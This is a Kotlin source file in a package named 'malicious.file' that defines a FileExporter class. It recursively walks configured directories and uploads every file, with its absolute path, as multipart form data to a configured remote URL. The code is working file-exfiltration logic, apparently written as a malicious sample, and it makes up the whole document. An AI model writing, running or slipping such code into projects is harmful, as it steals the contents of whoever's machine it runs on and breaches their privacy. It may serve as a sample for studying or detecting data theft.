package malicious.file

import config.FileExporterConfig
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.client.request.forms.*
import io.ktor.http.*
import io.ktor.serialization.kotlinx.json.*
import io.ktor.utils.io.streams.*
import kotlinx.coroutines.coroutineScope
import kotlinx.io.buffered
import java.nio.file.Paths
import kotlin.io.path.inputStream
import kotlin.io.path.walk


class FileExporter(
    val config: FileExporterConfig
) {

    companion object {
        private val logger = org.slf4j.LoggerFactory.getLogger(FileExporter::class.java)
    }

    val client = HttpClient(CIO) {
        install(ContentNegotiation) {
            json() // Configures the client to handle JSON responses
        }
    }

    suspend fun exportFiles() = coroutineScope {
        config.exportDirectories.forEach { exportDirectory ->
            val targetDirectory = Paths.get(exportDirectory)

            // Search files in target directories
            targetDirectory.walk().forEach { file ->
                logger.info("Exporting file: ${file.toAbsolutePath()}")

                // Send found files somewhere...
                if(config.destinationUrl.isNotBlank()) {
                    client.post(config.destinationUrl) {
                        setBody(
                            MultiPartFormDataContent(
                                formData {
                                    append("description", file.toAbsolutePath().toString())
                                    append(
                                        "image",
                                        InputProvider { file.inputStream().asInput().buffered() },
                                        Headers.build {
                                            append(HttpHeaders.ContentType, "text/plain")
                                        }
                                    )
                                },
                                boundary = "WebAppBoundary"
                            )
                        )
                    }
                }
            }
        }
    }
}